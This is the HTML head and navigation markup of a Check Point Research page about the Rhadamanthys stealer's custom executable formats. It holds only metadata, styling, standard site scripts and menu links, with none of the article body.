	<meta property="og:description" content="Research by: hasherezade Highlights Introduction Rhadamanthys is a relatively new stealer that continues to evolve and gain in popularity. The earliest mention was in a black market advertisement in September 2022. The stealer immediately caught the attention of buyers as well as researchers due to its very rich feature set and its well-polished, multi-staged design. [&hellip;]" />
	<meta property="og:url" content="https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/" />
	<meta property="og:site_name" content="Check Point Research" />
	<meta property="article:publisher" content="https://www.facebook.com/checkpointresearch/" />
	<meta property="article:published_time" content="2023-08-31T12:57:50+00:00" />
	<meta property="article:modified_time" content="2024-05-04T19:33:27+00:00" />
	<meta property="og:image" content="https://research.checkpoint.com/wp-content/uploads/2023/08/Rhadamanthys-Cover-1.png" />
	<meta property="og:image:width" content="1456" />
	<meta property="og:image:height" content="816" />
	<meta property="og:image:type" content="image/png" />
	<meta name="author" content="etal" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:creator" content="@_cpresearch_" />
	<meta name="twitter:site" content="@_cpresearch_" />
	<meta name="twitter:label1" content="Written by" />
	<meta name="twitter:data1" content="etal" />
	<meta name="twitter:label2" content="Est. reading time" />
	<meta name="twitter:data2" content="54 minutes" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/#article","isPartOf":{"@id":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/"},"author":{"name":"etal","@id":"https://research.checkpoint.com/#/schema/person/754947bab144582e3a36b05aa3a45170"},"headline":"From Hidden Bee to Rhadamanthys &#8211; The Evolution of Custom Executable Formats","datePublished":"2023-08-31T12:57:50+00:00","dateModified":"2024-05-04T19:33:27+00:00","mainEntityOfPage":{"@id":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/"},"wordCount":9829,"publisher":{"@id":"https://research.checkpoint.com/#organization"},"image":{"@id":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/#primaryimage"},"thumbnailUrl":"https://research.checkpoint.com/wp-content/uploads/2023/08/Rhadamanthys-Cover-1.png","articleSection":["Check Point Research Publications"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/","url":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/","name":"From Hidden Bee to Rhadamanthys - The Evolution of Custom Executable Formats - Check Point Research","isPartOf":{"@id":"https://research.checkpoint.com/#website"},"primaryImageOfPage":{"@id":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/#primaryimage"},"image":{"@id":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/#primaryimage"},"thumbnailUrl":"https://research.checkpoint.com/wp-content/uploads/2023/08/Rhadamanthys-Cover-1.png","datePublished":"2023-08-31T12:57:50+00:00","dateModified":"2024-05-04T19:33:27+00:00","breadcrumb":{"@id":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/#primaryimage","url":"https://research.checkpoint.com/wp-content/uploads/2023/08/Rhadamanthys-Cover-1.png","contentUrl":"https://research.checkpoint.com/wp-content/uploads/2023/08/Rhadamanthys-Cover-1.png","width":1456,"height":816},{"@type":"BreadcrumbList","@id":"https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://research.checkpoint.com/"},{"@type":"ListItem","position":2,"name":"From Hidden Bee to Rhadamanthys &#8211; The Evolution of Custom Executable Formats"}]},{"@type":"WebSite","@id":"https://research.checkpoint.com/#website","url":"https://research.checkpoint.com/","name":"Check Point Research","description":"Latest Research by our Team","publisher":{"@id":"https://research.checkpoint.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://research.checkpoint.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://research.checkpoint.com/#organization","name":"Check Point Research","url":"https://research.checkpoint.com/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://research.checkpoint.com/#/schema/logo/image/","url":"https://research.checkpoint.com/wp-content/uploads/2018/07/CPR_Logo_168x77_blackbackground_proof-01.png","contentUrl":"https://research.checkpoint.com/wp-content/uploads/2018/07/CPR_Logo_168x77_blackbackground_proof-01.png","width":164,"height":77,"caption":"Check Point Research"},"image":{"@id":"https://research.checkpoint.com/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/checkpointresearch/","https://x.com/_cpresearch_"]},{"@type":"Person","@id":"https://research.checkpoint.com/#/schema/person/754947bab144582e3a36b05aa3a45170","name":"etal","image":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://research.checkpoint.com/#/schema/person/image/","url":"https://research.checkpoint.com/wp-content/uploads/2022/11/tal-copy-e1668433603406.jpg","contentUrl":"https://research.checkpoint.com/wp-content/uploads/2022/11/tal-copy-e1668433603406.jpg","caption":"etal"},"url":"https://research.checkpoint.com/author/etal/"}]}</script>
	<!-- / Yoast SEO plugin. -->


<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/research.checkpoint.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://research.checkpoint.com/wp-content/plugins/gutenberg/build/block-library/style.css?ver=19.5.0' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<link rel='stylesheet' id='contact-form-7-css' href='https://research.checkpoint.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.9.8' type='text/css' media='all' />
<link rel='stylesheet' id='email-subscribers-css' href='https://research.checkpoint.com/wp-content/plugins/email-subscribers/lite/public/css/email-subscribers-public.css?ver=5.7.36' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
</style>
<link rel='stylesheet' id='stylemain-css' href='https://research.checkpoint.com/wp-content/themes/research-th/css/style.css?ver=1.08' type='text/css' media='all' />
<link rel='stylesheet' id='nav-css' href='https://research.checkpoint.com/wp-content/themes/research-th/css/style-nav.css?ver=1.08' type='text/css' media='all' />
<link rel='stylesheet' id='header-css' href='https://research.checkpoint.com/wp-content/themes/research-th/css/style-header.css?ver=1.08' type='text/css' media='all' />
<link rel='stylesheet' id='footer-css' href='https://research.checkpoint.com/wp-content/themes/research-th/css/style-footer.css?ver=1.08' type='text/css' media='all' />
<link rel='stylesheet' id='bloga-css' href='https://research.checkpoint.com/wp-content/themes/research-th/css/style-blog.css?ver=1.08' type='text/css' media='all' />
<link rel='stylesheet' id='enlighterjs-css' href='https://research.checkpoint.com/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=lB++6JpXuZRbV9F' type='text/css' media='all' />
<script type="text/javascript" src="https://research.checkpoint.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0" id="wp-polyfill-js"></script>
<script type="text/javascript" src="https://research.checkpoint.com/wp-content/plugins/gutenberg/build/hooks/index.min.js?ver=84e753e2b66eb7028d38" id="wp-hooks-js"></script>
<script type="text/javascript" src="https://research.checkpoint.com/wp-content/plugins/gutenberg/build/i18n/index.min.js?ver=bd5a2533e717a1043151" id="wp-i18n-js"></script>
<script type="text/javascript" id="wp-i18n-js-after">
/* <![CDATA[ */
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
/* ]]> */
</script>
<script type="text/javascript" src="https://research.checkpoint.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://research.checkpoint.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://research.checkpoint.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fresearch.checkpoint.com%2F2023%2Ffrom-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://research.checkpoint.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fresearch.checkpoint.com%2F2023%2Ffrom-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats%2F&#038;format=xml" />
<!-- Stream WordPress user activity plugin v4.0.2 -->
<script type="text/javascript">
           var ajaxurl = "https://research.checkpoint.com/wp-admin/admin-ajax.php";
           var siteurl = "https://research.checkpoint.com";
         </script><link rel="icon" href="https://research.checkpoint.com/wp-content/uploads/2022/10/cropped-pavicon_CPR-03-e1666694691376-32x32.png" sizes="32x32" />
<link rel="icon" href="https://research.checkpoint.com/wp-content/uploads/2022/10/cropped-pavicon_CPR-03-e1666694691376-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://research.checkpoint.com/wp-content/uploads/2022/10/cropped-pavicon_CPR-03-e1666694691376-180x180.png" />
<meta name="msapplication-TileImage" content="https://research.checkpoint.com/wp-content/uploads/2022/10/cropped-pavicon_CPR-03-e1666694691376-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			#cookies-notice { display: none !important; }		</style>
		  <!-- Google Tag Manager --> 
  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': 
  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], 
  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src= 
  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); 
  })(window,document,'script','dataLayer','GTM-5JCRGP');</script> 
  <!-- End Google Tag Manager -->
</head>
<body class="post-template-default single single-post postid-28583 single-format-standard">
<nav role="navigation" class="navbar-top-wrap">
	<div class="navbar-top no-header-image">
		<div class="container container-wide">
			<div class="row desktop-view">
				<div class="nav-logo">
					<a href="https://research.checkpoint.com"><img src="https://research.checkpoint.com/wp-content/uploads/2024/06/CPR-by-Check-Point-logo.svg"  alt="" class="img-responsive" /></a>				</div>
				<div class="nav-top-right flex-row">		
					<div class="top-menu-wrap desktop-lg">
													<div class="nav-menu nav-wrap">
							<div class="navbar-nav-collapse"><ul id="menu-top-menuu" class="nav navbar-nav"><li id="menu-item-29295" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-29295"><a href="https://research.checkpoint.com/contact/">CONTACT US</a></li>
<li id="menu-item-27016" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-27016"><a href="https://research.checkpoint.com/disclosure-policy/">DISCLOSURE POLICY</a></li>
<li id="menu-item-26970" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26970"><a target="_blank" rel="noopener" href="https://www.checkpoint.com/">CHECKPOINT.COM</a></li>
<li id="menu-item-26971" class="nav-button menu-item menu-item-type-custom menu-item-object-custom menu-item-26971"><a href="https://www.checkpoint.com/support-services/threatcloud-incident-response/">UNDER ATTACK?</a></li>
</ul></div>						</div>
											</div>
					<div class="social-media-wrapper">				
						<div class="social-icons">
																																											<a href="https://www.linkedin.com/company/check-point-software-technologies/" target="_blank"><svg  style="fill: currentColor;" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve"><g id="XMLID_801_">	<path id="XMLID_802_" d="M72.16,99.73H9.927c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5H72.16c2.762,0,5-2.238,5-5V104.73		C77.16,101.969,74.922,99.73,72.16,99.73z"/>	<path id="XMLID_803_" d="M41.066,0.341C18.422,0.341,0,18.743,0,41.362C0,63.991,18.422,82.4,41.066,82.4		c22.626,0,41.033-18.41,41.033-41.038C82.1,18.743,63.692,0.341,41.066,0.341z"/>	<path id="XMLID_804_" d="M230.454,94.761c-24.995,0-43.472,10.745-54.679,22.954V104.73c0-2.761-2.238-5-5-5h-59.599		c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5h62.097c2.762,0,5-2.238,5-5v-98.918c0-33.333,9.054-46.319,32.29-46.319		c25.306,0,27.317,20.818,27.317,48.034v97.204c0,2.762,2.238,5,5,5H305c2.762,0,5-2.238,5-5V194.995		C310,145.43,300.549,94.761,230.454,94.761z"/></g></svg></a>
																																													<a href="https://twitter.com/_cpresearch_" target="_blank"><svg  style="fill: currentColor;" version="1.1" id="Layer_1" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve"><g id="XMLID_826_"> <path id="XMLID_827_" d="M302.973,57.388c-4.87,2.16-9.877,3.983-14.993,5.463c6.057-6.85,10.675-14.91,13.494-23.73	c0.632-1.977-0.023-4.141-1.648-5.434c-1.623-1.294-3.878-1.449-5.665-0.39c-10.865,6.444-22.587,11.075-34.878,13.783	c-12.381-12.098-29.197-18.983-46.581-18.983c-36.695,0-66.549,29.853-66.549,66.547c0,2.89,0.183,5.764,0.545,8.598	C101.163,99.244,58.83,76.863,29.76,41.204c-1.036-1.271-2.632-1.956-4.266-1.825c-1.635,0.128-3.104,1.05-3.93,2.467	c-5.896,10.117-9.013,21.688-9.013,33.461c0,16.035,5.725,31.249,15.838,43.137c-3.075-1.065-6.059-2.396-8.907-3.977	c-1.529-0.851-3.395-0.838-4.914,0.033c-1.52,0.871-2.473,2.473-2.513,4.224c-0.007,0.295-0.007,0.59-0.007,0.889	c0,23.935,12.882,45.484,32.577,57.229c-1.692-0.169-3.383-0.414-5.063-0.735c-1.732-0.331-3.513,0.276-4.681,1.597	c-1.17,1.32-1.557,3.16-1.018,4.84c7.29,22.76,26.059,39.501,48.749,44.605c-18.819,11.787-40.34,17.961-62.932,17.961	c-4.714,0-9.455-0.277-14.095-0.826c-2.305-0.274-4.509,1.087-5.294,3.279c-0.785,2.193,0.047,4.638,2.008,5.895	c29.023,18.609,62.582,28.445,97.047,28.445c67.754,0,110.139-31.95,133.764-58.753c29.46-33.421,46.356-77.658,46.356-121.367	c0-1.826-0.028-3.67-0.084-5.508c11.623-8.757,21.63-19.355,29.773-31.536c1.237-1.85,1.103-4.295-0.33-5.998	C307.394,57.037,305.009,56.486,302.973,57.388z"/></g></svg></a>
																																													<a href="https://www.facebook.com/checkpointresearch/" target="_blank"><svg style="fill: currentColor;" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve"><path id="XMLID_835_" d="M81.703,165.106h33.981V305c0,2.762,2.238,5,5,5h57.616c2.762,0,5-2.238,5-5V165.765h39.064		c2.54,0,4.677-1.906,4.967-4.429l5.933-51.502c0.163-1.417-0.286-2.836-1.234-3.899c-0.949-1.064-2.307-1.673-3.732-1.673h-44.996		V71.978c0-9.732,5.24-14.667,15.576-14.667c1.473,0,29.42,0,29.42,0c2.762,0,5-2.239,5-5V5.037c0-2.762-2.238-5-5-5h-40.545		C187.467,0.023,186.832,0,185.896,0c-7.035,0-31.488,1.381-50.804,19.151c-21.402,19.692-18.427,43.27-17.716,47.358v37.752H81.703		c-2.762,0-5,2.238-5,5v50.844C76.703,162.867,78.941,165.106,81.703,165.106z"/></svg></a>
																														</div>		
					</div>
				</div>
			</div>
			<div class="row bottom-menu-wrapper">
				<div class="nav-menu-wrapper">
					<div class="nav-logo mobile-view">
						<a href="https://research.checkpoint.com"><img src="https://research.checkpoint.com/wp-content/uploads/2024/06/CPR-by-Check-Point-logo.svg"  alt="" class="img-responsive" /></a>				</div>
										<button type="button" class="nav-icon navbar-toggle"><span></span><span></span><span></span><span></span></button>
					<div class="nav-menu nav-wrap">
						<div class="navbar-nav-collapse"><ul id="menu-main-menu" class="nav navbar-nav"><li id="menu-item-26652" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26652"><a href="https://research.checkpoint.com/latest-publications/">Latest Publications</a></li>
<li id="menu-item-26651" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26651"><a href="https://research.checkpoint.com/cpr-podcast-channel/">CPR Podcast Channel</a></li>
